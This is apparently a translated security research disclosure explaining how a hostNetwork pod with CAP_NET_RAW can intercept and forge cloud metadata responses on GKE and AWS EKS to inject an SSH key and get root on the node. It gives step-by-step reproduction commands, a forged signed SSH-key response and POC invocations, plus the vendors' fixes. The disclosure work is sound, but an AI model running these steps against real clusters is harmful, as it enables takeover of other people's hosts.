在发现使用容器CAP_NET_RAW可以让您通过 IPv6 流氓路由器广告发起主机 MITM 攻击之后，除了使用网桥 CNI 时的经典 ARP 欺骗之外，我继续寻找更有趣的网络攻击。

CAP_NET_RAWLinux 功能允许您打开原始套接字以侦听网络命名空间 (tcpdump) 中的所有流量，还可以发送任何类型的数据包。 CAP_NET_RAW默认情况下在 Docker/Containerd 中启用，但在cri-o 中不启用，因为 1.18 仅允许ping工作。这是一个糟糕的默认值，应该被net.ipv4.ping_group_rangesysctls的使用所取代。

使用 TLS 的流量越来越安全，但是在许多云提供商上，您可以通过http://169.254.169.254上的 HTTP 访问元数据服务，并且有时可以在提供的元数据中找到用户 ssh 公钥。AWS、GCP 和其他可能允许使用实例启动时不存在的 ssh 密钥连接到实例，这意味着它们在运行时通过 HTTP 动态检索新的 ssh 密钥，因此 MITM 允许我们插入我们的 ssh 密钥并作为 sudoer 登录或root用户。

通过使用hostNetwork=true+ CAP_NET_RAW，可以在 EKS 和 GKE 集群上的节点上获得 root 权限。

另一种获得 MITM 的方法是使用K8S CVE-2020-8554。

在我的测试中，Azure 正在安全地检索 ssh 密钥，而cloud-initLinux 包仅在启动早期检索一次 ssh 密钥。

谷歌 GKE

攻击者可以访问hostNetwork=true具有CAP_NET_RAW功能的容器，可以侦听通过主机的所有流量并注入任意流量，从而可以篡改大多数未加密的流量（HTTP、DNS、DHCP 等），并破坏加密的流量。在 GKE 中，主机通过http://169.254.169.254查询元数据服务以获取信息，包括授权的 ssh 密钥。通过操纵元数据服务响应，注入我们自己的 ssh 密钥，我们获得了主机上的 root 权限。

  1. 创建 GKE 集群

  2. 创建一个hostNetwork=true豆荚

kubectl apply -f - <<'EOF'apiVersion: v1kind: Podmetadata:  name: ubuntu-nodespec:  hostNetwork: true  containers:  - name: ubuntu    image: ubuntu:latest    command: [ "/bin/sleep", "inf" ]EOF

3.复制metadatascape.py 脚本）

kubectl cp metadatascapy.py ubuntu-node:/metadatascapy.py

4.连接到容器

kubectl exec -ti ubuntu-node -- /bin/bash

（接下来的命令在容器外壳中）

5.安装需要的包

apt update && apt install -y python3-scapy openssh-client

6.生成一个 ssh 密钥（这是我们将要注入并用于 ssh 到主机的密钥）

ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""

7.启动脚本，等待 2 分钟，享受

python3 /metadatascapy.py

  1. （如果您看到 kubeconfig 和一些打印的证书，则它有效）

要像 HTTP 请求一样劫持 TCP 连接，您需要拥有正确的 TCP 序列号，并且响应速度比服务器快。由于 Google 使用 HTTP 长池来等待新的 SSH 密钥（1 分钟以上），并且我们可以监听所有流量，因此使用 Scapy 伪造 TCP 数据包非常容易。

有两种方法可以注入流量，以便同一主机可以接收流量：

  1. 使用 L2 原始套接字和“lo”接口

  2. 使用 L3 原始套接字

过去，在 lo 接口上使用 L2 套接字不起作用，因此Scapy FAQ 建议使用 L3。此外，GKE 节点已经在使用net.ipv4.conf.all.rp_filter = 1sysctl 有效地阻止 L2。为了阻止 L3 Google 团队在 GKE 节点上添加了以下 iptables 规则

iptables -w -t mangle -I OUTPUT -s 169.254.169.254 -j DROP

此 iptables 规则已添加到

  • 1.19.2-gke.2400

  • 1.18.9-gke.2500

  • 1.17.12-gke.2500

  • 1.16.15-gke.2600

这只会修复 GKE，如果您自己在 GCP 实例上部署 K8S，您可能仍然容易受到攻击。

AWS EKS

AWS 允许使用名为“EC2 Instance Connect”的功能通过 SSH 连接到 Linux 实例为此，AWS AMI 在 SSH 配置 (sshd_config) 中有以下行：

AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys %u %f

在（前修复）eic_curl_authorized_keys脚本在查询中的元数据服务http://169.254.169.254 一个响应的是实例名称和过期时间戳像这样的SSH密钥的签署名单：

#Timestamp=2147483647#Instance=realinstancename#Caller=wedontcare#Request=wedontcaressh-rsa ...sha256/rsa signature in base64

我们无法在不同的实例上重放这些响应：

  • 实例名称通过 HTTP 检索，但经过验证

  • 并且我们没有与此公钥匹配的私钥

现在，如果我们回到 eic_curl_authorized_keys 的开头，会发生以下情况：

  1. 定义元数据服务的地址为http://169.254.169.254/

  2. PUT /latest/api/token

    -> 获取元数据 v2 令牌

  3. GET /latest/meta-data/instance-id/

    -> 获取实例 ID，然后根据 /sys/devices/virtual/dmi/id/board_asset_tag 对其进行验证

  4. HEAD /latest/meta-data/managed-ssh-keys/active-keys/USER/

  5. GET /latest/meta-data/placement/availability-zone/

    -> 从可用区名称中提取区域名称 (us-east-2)

  6. 获取/最新/元数据/服务/域/

    -> 在我所在的地区，这是 amazonaws.com

  7. 用 5 和 6 我们推导出签名者证书的预期 CN

    expected_signer="managed-ssh-signer.${region}.${domain}"

  8. GET /latest/meta-data/managed-ssh-keys/signer-cert/

    -> 签名者证书 + 链

  9. GET /latest/meta-data/managed-ssh-keys/signer-ocsp/

    -> 对于每个证书，它的 SHA1 指纹

  10. GET /latest/meta-data/managed-ssh-keys/signer-ocsp/SHA1

    -> 检索实际的 OCSP 响应

  11. GET /latest/meta-data/managed-ssh-keys/active-keys/USER/

    -> 获取已签名的 ssh 密钥列表

  12. 将所有这些传递给eic_parse_authorized_keys

    -> 此脚本检查证书是否与 expected_signer 匹配、是否可信且具有有效的 OCSP 响应。

如果您仔细阅读，能够在 eic_curl_authorized_keys 脚本和元数据服务之间执行 MITM 的攻击者可以注入 4/6/8/9/10/11 的响应，然后以 root 身份在实例上 SSH

简而言之：

  • 受亚马逊签名的 managed-ssh-signer.us-east-2.amazonaws.com 是可信的

  • 由 Let's Encrypt 签名的 managed-ssh-signer.us-east-2.champetier.net 也可以信任正确的响应

在 AWS EKS 上，能够以 root 身份在 hostNetwork pod 中执行任意代码的攻击者可以使用该CAP_NET_RAW功能在实例上监控和注入数据包。

这个 POC 展示了我们从 hostNetwork 到节点是多么容易。它使用 Golang (gopacket)，因为 scapy 注入数据包的速度通常比元数据服务响应要慢，这使得攻击不可靠。

  1. 文件：

    1. cert0.pem：CN=managed-ssh-signer.us-east-2.champetier.net，2021 年 1 月 10 日过期

    2. privkey.pem : 证书的私钥

    3. cert1.pem : CN=Let's Encrypt Authority X3

    4. cert2.pem : CN=DST 根 CA X3

    5. go.mod、go.sum、mitmmeta.go：Golang POC

  2. 在 us-east-2 区域部署 EKS 集群，配置 kubectl

    我们可以针对其他区域，但提供的 cert0.pem 是针对 us-east-2 在我的测试中，AMI 是 AL2_x86_64 / 1.17.11-20201007

  3. 启动一个 hostNetwork pod

kubectl apply -f - <<'EOF'apiVersion: v1kind: Podmetadata:name: ubuntu-nodespec:hostNetwork: truecontainers:- name: ubuntuimage: ubuntu:latestcommand: [ "/bin/sleep", "inf" ]EOF

4.复制容器中的7个文件

kubectl cp . ubuntu-node:/

5.连接到容器

kubectl exec -ti ubuntu-node -- /bin/bash

接下来的命令都在pod中运行

6.安装需要的软件

apt update && apt install -y openssh-client curl openssl libpcap-dev golang

7.构建 Golang POC

go build .

8.下载 OCSP 响应，连接签名者证书

downloadocsp() {    fingerprint=$(openssl x509 -noout -fingerprint -sha1 -inform pem -in "${1}" | /bin/sed -n 's/SHA1 Fingerprint[[:space:]]*=[[:space:]]*\(.*\)/\1/p' | tr -d ':')    ocsp_url="$(openssl x509 -noout -ocsp_uri -in "${1}")"    openssl ocsp -no_nonce -issuer "${2}" -cert "${1}" -url "$ocsp_url" -respout "${3}/$fingerprint-raw"    base64 -w0 "${3}/$fingerprint-raw" > "${3}/$fingerprint"    rm -f "${3}/$fingerprint-raw"}mkdir ocspdownloadocsp cert0.pem cert1.pem ocspdownloadocsp cert1.pem cert2.pem ocspcat cert0.pem cert1.pem > signer.pem

9.生成一个 SSH 密钥，这是我们将用来连接的密钥

ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""

10.准备 API“ssh 响应”

cat > sshkeys-unsigned <<EOF#Timestamp=2147483647#Instance=$(curl http://169.254.169.254/latest/meta-data/instance-id/ -s)#Caller=wedontcare#Request=wedontcareEOFcat /root/.ssh/id_ed25519.pub >> sshkeys-unsignedopenssl dgst -sha256 -sigopt rsa_padding_mode:pss -sigopt rsa_pss_saltlen:32 -sign privkey.pem sshkeys-unsigned | base64 -w0 > sshkeys-signaturecat sshkeys-unsigned sshkeys-signature > sshkeysecho "" >> sshkeys

11.启动 POC

./mitmmeta

12.在第二个 shell 中，连接到 pod 并连接到节点

kubectl exec -ti ubuntu-node -- /bin/bashssh root@127.0.0.1

  1. 您现在是该实例的 root
